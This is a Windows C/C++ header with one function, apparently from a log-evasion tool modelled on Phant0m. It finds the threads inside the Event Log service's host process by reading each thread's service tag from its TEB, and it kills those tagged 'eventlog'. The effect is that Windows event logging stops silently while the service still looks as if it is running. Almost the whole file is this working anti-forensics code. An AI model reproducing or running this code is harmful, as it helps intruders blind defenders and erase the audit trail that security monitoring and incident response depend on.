#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <strsafe.h>

// Inspired from https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/SuspendorResumeTidEx.cpp
BOOL Technique_1(DWORD dwEventLogPID) {

	printf("[*] Using Technique-1 for killing threads...\n");

	BOOL killStatus = FALSE;
	
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	
	if (hNtdll != NULL) {

		typedef NTSTATUS(WINAPI* _NtQueryInfomationThread)(HANDLE, LONG, PVOID, ULONG, PULONG);

		_NtQueryInfomationThread NtQueryInformationThread = (_NtQueryInfomationThread)GetProcAddress(hNtdll, "NtQueryInformationThread");

		HMODULE hAdvapi32 = GetModuleHandleA("advapi32.dll");

		if (hAdvapi32 != NULL) {

			typedef struct _CLIENT_ID {
				HANDLE UniqueProcess;
				HANDLE UniqueThread;
			} CLIENT_ID;

			typedef struct _THREAD_BASIC_INFORMATION {
				NTSTATUS    exitStatus;
				PVOID       pTebBaseAddress;
				CLIENT_ID   clientId;
				KAFFINITY	AffinityMask;
				int			Priority;
				int			BasePriority;
				int			v;

			} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;

			typedef enum _SC_SERVICE_TAG_QUERY_TYPE {
				ServiceNameFromTagInformation = 1,
				ServiceNameReferencingModuleInformation,
				ServiceNameTagMappingInformation,
			} SC_SERVICE_TAG_QUERY_TYPE, * PSC_SERVICE_TAG_QUERY_TYPE;

			typedef struct _SC_SERVICE_TAG_QUERY {
				ULONG   processId;
				ULONG   serviceTag;
				ULONG   reserved;
				PVOID   pBuffer;
			} SC_SERVICE_TAG_QUERY, * PSC_SERVICE_TAG_QUERY;

			typedef ULONG(WINAPI* _I_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);

			_I_QueryTagInformation I_QueryTagInformation = (_I_QueryTagInformation)GetProcAddress(hAdvapi32, "I_QueryTagInformation");

			SC_SERVICE_TAG_QUERY scTagQuery = { 0 };
			ULONG hTag = NULL;

			THREADENTRY32 te32;
			THREAD_BASIC_INFORMATION tbi = { 0 };
			te32.dwSize = sizeof(THREADENTRY32);

			HANDLE hThreads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

			BOOL threadList = Thread32First(hThreads, &te32);

			HANDLE hEvtProcess = NULL;
			HANDLE hEvtThread = NULL;

			while (threadList) {

				if (te32.th32OwnerProcessID == dwEventLogPID) {

					hEvtThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_TERMINATE, FALSE, te32.th32ThreadID);

					NtQueryInformationThread(hEvtThread, (THREAD_INFORMATION_CLASS)0, &tbi, 0x30, NULL);

					hEvtProcess = OpenProcess(PROCESS_VM_READ, FALSE, te32.th32OwnerProcessID);

					if (tbi.pTebBaseAddress != 0) {

						ReadProcessMemory(hEvtProcess, ((PBYTE)tbi.pTebBaseAddress + 0x1720), &hTag, sizeof(HANDLE), NULL);

						scTagQuery.processId = te32.th32OwnerProcessID;
						scTagQuery.serviceTag = hTag;

						I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &scTagQuery);

						char serviceName[MAX_PATH] = { 0 };
						size_t cbDest = MAX_PATH * sizeof(char);

						StringCbPrintfA(serviceName, cbDest, "%ws", (PCWSTR)scTagQuery.pBuffer);

						if (_stricmp(serviceName, "eventlog") == 0) {

							if (TerminateThread(hEvtThread, 0) == 0) {

								printf("[!] Thread %d is detected but kill failed. Error code is: %d\n", te32.th32ThreadID, GetLastError());

							}
							else {

								printf("[+] Thread %d is detected and successfully killed.\n", te32.th32ThreadID);

							}
							
						}

						scTagQuery = { 0 }; // Clear array

						CloseHandle(hEvtThread);
						CloseHandle(hEvtProcess);
					}

				}

				threadList = Thread32Next(hThreads, &te32);

			}

			CloseHandle(hThreads);

		}

	}
	
	return killStatus;
}